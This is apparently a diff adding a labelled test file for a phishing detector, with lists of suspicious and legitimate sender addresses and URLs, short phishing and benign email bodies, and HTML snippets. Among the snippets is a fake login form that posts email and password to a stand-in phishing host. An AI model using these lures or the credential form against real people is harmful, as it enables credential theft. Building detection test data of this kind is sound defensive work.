@@ -1,0 +1,194 @@
+Suspicious Email IDs
+
+alerts@paypal-security-check.com
+login@netflix-account-verify.info
+support@icicibank-login.xyz
+contact@secure-banking-auth.com
+user@freegiftclaim.ru
+info@netflix-loginupdate.net
+admin@hdfc-update-verification.cc
+noreply@hostingsupport-services.store
+
+****************************************
+Free Email Domains
+
+secure.help.team@gmail.com
+netflix.support.center@yahoo.com
+admin.bank.notice@outlook.com
+hdfc.security.unit@hotmail.com
+user.login.warning123@gmail.com
+
+***************************************
+Legitimate Corporate Email IDs
+
+support@amazon.in
+no-reply@netflix.com
+alerts@icicibank.com
+admin@github.com
+customerservice@hdfcbank.com
+hello@openai.com
+noreply@google.com
+
+****************************************
+
+Phishing or Malicious URLs
+
+http://192.168.1.1/login
+http://paypal.login-secure.com
+http://free-gift-prize.win/claim
+http://secure-update-account.netlify.app
+http://verify-account.nowfreeprize.ru
+http://login-update.bankofindia.xyz
+https://secure-login--netflix.com
+http://malicious-site.com/phish
+
+**************************************
+
+Suspicious but Not Always Malicious
+
+http://abc-def-xyz-login.herokuapp.com
+https://login-user-authentic.com
+https://secure-icici-banking-help.surge.sh
+http://verify.netflix-account.help
+https://support-user-valid.info
+
+***************************************
+Legitimate and Safe URLs
+
+https://google.com
+https://www.amazon.in
+https://netflix.com/login
+https://icicibank.com
+https://github.com
+https://meet.google.com
+https://www.wikipedia.org
+
+
+***************************************
+
+Dear Customer,
+
+We detected unusual activity on your account. Please verify your identity to avoid suspension.
+
+Click the link below:
+http://secure-login-bank.com/verify
+
+Thank you,
+Bank Support
+  
+
+*************************************************************
+
+🎉 Congratulations!
+
+You've won a brand new iPhone 15! Just confirm your details at the link below:
+
+https://claim-prize-now.xyz/win
+
+Act fast, this is a limited-time offer!
+
+**************************************************************
+
+Your PayPal account has been locked due to multiple failed login attempts.
+
+To unlock it, visit:
+http://paypal-security-check.com
+
+Failure to act will result in permanent lock.
+
+**************************************************************
+
+Hi Team,
+
+Please join the weekly sync-up meeting at 10 AM tomorrow.
+
+Google Meet link:
+https://meet.google.com/abc-defg-hij
+
+Regards,
+Project Manager
+
+****************************************************************
+
+Hi,
+
+Your invoice for order #12478 is attached.
+
+You can also track your delivery here:
+https://www.amazon.in/gp/your-account/order-details
+
+Thanks for shopping with us!
+
+*****************************************************************
+
+Website Content
+
+<html>
+  <body>
+    <h1>Login to Secure Your Account</h1>
+    <form action="http://phishingsite.com/login">
+      <input type="text" name="email" />
+      <input type="password" name="pass" />
+      <button type="submit">Login</button>
+    </form>
+  </body>
+</html>
+
+
+<html>
+  <body>
+    <h1>Login to Secure Your Account</h1>
+    <form action="http://phishingsite.com/login">
+      <input type="text" name="email" />
+      <input type="password" name="pass" />
+      <button type="submit">Login</button>
+    </form>
+  </body>
+</html>
+
+
+<html>
+  <body>
+    <form>
+      <label>Email:</label>
+      <input type="email" name="email" />
+      <input type="submit" value="Subscribe" />
+    </form>
+  </body>
+</html>
+
+
+<html>
+  <body>
+    <script src="http://tracker1.com/x.js"></script>
+    <script src="http://cdn2.com/y.js"></script>
+    <script src="http://cdn3.com/z.js"></script>
+    <script src="http://cdn4.com/a.js"></script>
+  </body>
+</html>
+
+
+<html>
+  <body>
+    <h1>Phishing</h1>
+    <p>Phishing is a type of cybercrime...</p>
+  </body>
+</html>
+
+
+<html>
+  <body>
+    <h1>Welcome to OpenAI</h1>
+    <p>We are an AI research and deployment company...</p>
+  </body>
+</html>
+
+
+
+
+
+
+
+
+
+
